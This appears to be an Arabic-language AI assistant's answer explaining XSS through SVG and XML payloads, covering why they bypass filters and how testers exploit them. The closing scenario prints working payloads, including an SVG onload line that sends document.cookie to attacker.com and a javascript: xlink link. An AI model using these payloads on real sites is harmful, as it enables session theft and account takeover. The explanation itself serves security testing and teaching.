بناءً على طلبك لشرح **الحقن المستخدمة في SVG وXML (SVG and XML Payloads)** باستخدام نفس طريقة الشرح المقدمة (التي تتضمن أقسامًا مثل "ما المقصود؟"، "لماذا يعمل؟"، "كيف يتم الاستغلال؟"، والخطوات العملية)، سأقدم شرحًا مفصلاً ومنظمًا لهذه الخطوة في اختبار ثغرات Cross-Site Scripting (XSS). سأغطي جميع المحاولات الممكنة لاستغلال ثغرة XSS باستخدام تنسيقات **SVG** (Scalable Vector Graphics) و**XML**، مع التركيز على حقن JavaScript داخل هذه التنسيقات لتنفيذ شيفرات ضارة. سيتم تقسيم المحاولات إلى فئات (مثل حقن SVG باستخدام وسم `<script>`، استخدام أحداث SVG، واستغلال XML عبر XLink أو معالجة البيانات). سيتم تضمين المحتوى في علامة `<xaiArtifact>` كما هو مطلوب، مع معرف جديد لأن هذا طلب مستقل يركز على خطوة محددة. سأحافظ على الشرح باللغة العربية بأسلوب واضح ومنظم، متجنبًا تنسيق Markdown خارج العلامة بناءً على طلبك السابق.

---

## فهم الخطوة: الحقن المستخدمة في SVG وXML (SVG and XML Payloads)

### ما المقصود؟
الحقن المستخدمة في **SVG وXML** هي شيفرات JavaScript أو هياكل بيانات تُستخدم لاستغلال ثغرات Cross-Site Scripting (XSS) من خلال إدراج شيفرات ضارة داخل ملفات أو عناصر بتنسيق **SVG** (رسومات متجهية قابلة للتطوير) أو **XML** (لغة الترميز القابلة للتوسيع). تُستغل هذه الحقن في التطبيقات التي تسمح بتحميل أو عرض محتوى SVG/XML دون تنظيف كافٍ، مما يتيح تنفيذ JavaScript عبر وسوم مثل `<script>`، أحداث SVG (مثل `onload` أو `onclick`)، أو روابط XLink في XML. تُستخدم هذه الحقن في سياقات **XSS المنعكس**، **XSS المخزن**، و**XSS القائم على DOM** لتنفيذ إجراءات مثل سرقة البيانات، التلاعب بالصفحة، أو إعادة التوجيه.

### لماذا يعمل؟
- **دعم المتصفحات لـ SVG**: تُعامل المتصفحات ملفات SVG كجزء من DOM، مما يسمح بتنفيذ JavaScript داخل وسوم مثل `<script>` أو من خلال أحداث مثل `onload` و`onclick`.
- **مرونة XML**: يدعم XML روابط XLink ومعالجة البيانات التي يمكن أن تتضمن JavaScript أو إحالات خارجية، مما يتيح تنفيذ شيفرات ضارة إذا لم يتم تنظيف الإدخال.
- **ضعف التنظيف**: العديد من التطبيقات لا تُنظف محتوى SVG/XML بشكل صحيح، خاصة إذا سُمح بتحميل ملفات أو إدخال وسوم مباشرة.
- **تجاوز الفلاتر**: تُستخدم وسوم وأحداث SVG/XML لتجاوز فلاتر XSS التي تحظر وسوم HTML شائعة مثل `<script>` أو `<img>`.
- **إرسال البيانات**: يمكن للحقن إرسال بيانات حساسة (مثل `document.cookie`) إلى خادم خارجي عبر طلبات HTTP أو روابط XLink.

### كيف يتم الاستغلال؟
- يتم إدخال شيفرة SVG أو XML تحتوي على JavaScript في نقطة إدخال عرضة لـ XSS (مثل حقل تحميل ملف، معلمة URL، أو حقل نصي).
- تُصمم الحقنة لتُنفذ عند عرض المحتوى في المتصفح، إما مباشرة (مثل عرض صورة SVG) أو عند التفاعل (مثل النقر على عنصر SVG).
- تُستخدم الشيفرة لتنفيذ إجراءات ضارة مثل:
  - سرقة ملفات تعريف الارتباط (`document.cookie`).
  - استخراج محتوى الصفحة (`document.body.innerHTML`).
  - إعادة توجيه المستخدم إلى موقع ضار.
- يتم مراقبة خادم خارجي (إذا أُرسلت بيانات) أو استجابة المتصفح لتأكيد التنفيذ:
  - **نجاح (True)**: الشيفرة تُنفذ (مثل ظهور تنبيه أو إرسال بيانات إلى خادم المهاجم).
  - **فشل (False)**: لا يتم التنفيذ بسبب فلاتر أو قيود (مثل CSP أو تنظيف الإدخال).
- تُكيَّف الحقن لتجاوز القيود (مثل استخدام أحداث SVG غير شائعة أو تعتيم الشيفرة).

### السناريو
لنفترض أنك تختبر موقعًا إلكترونيًا يسمح بتحميل صور SVG في ملف تعريف المستخدم أو إدخال محتوى في حقل نصي يُعرض كجزء من صفحة. اكتشفت أن الموقع لا يُنظف محتوى SVG بشكل صحيح، ويمكن إدراج وسم مثل `<svg><script>alert('XSS')</script></svg>` لتنفيذ تنبيه. تريد الآن استخدام حقنة SVG مثل `<svg onload="fetch('http://attacker.com/log?c='+document.cookie)"></svg>` أو حقنة XML مثل `<a xlink:href="javascript:alert('XSS')">Click</a>` لاستخراج بيانات حساسة أو تنفيذ إجراءات ضارة. إذا تلقى خادمك البيانات أو نُفذت الشيفرة، فهذا يؤكد وجود ثغرة XSS عبر SVG/XML.

---
